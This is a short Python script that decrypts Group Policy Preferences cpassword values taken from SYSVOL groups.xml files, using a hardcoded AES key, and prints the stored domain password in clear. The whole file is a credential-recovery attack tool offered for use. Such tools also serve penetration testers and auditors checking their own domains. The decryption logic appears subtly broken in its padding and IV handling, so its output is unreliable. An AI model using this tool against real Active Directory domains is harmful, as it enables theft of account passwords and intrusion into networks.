#!/usr/bin/env python

#A python script by Apra to decode cpassword values found in SYSVOL groups.xml files

import sys
import base64
from Crypto.Cipher import AES

key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"

def usage():
    print "Usage: python %s <cpassword>" %(sys.argv[0])

def decrypt():
    cpassword = sys.argv[1]
    cpassword_padded = cpassword + "=" * (4 - (len(cpassword) % 4)) #add padding to b64 string for decoding
    decoded = base64.b64decode(cpassword_padded)
    IV = decoded[:AES.block_size] # Extract IV from the beginning of the decoded string
    aes = AES.new(key, AES.MODE_CBC, IV)
    decrypted = aes.decrypt(decoded)
    print "Password = %s" %(decrypted)

if len(sys.argv) != 2:
    usage()
else:
    decrypt()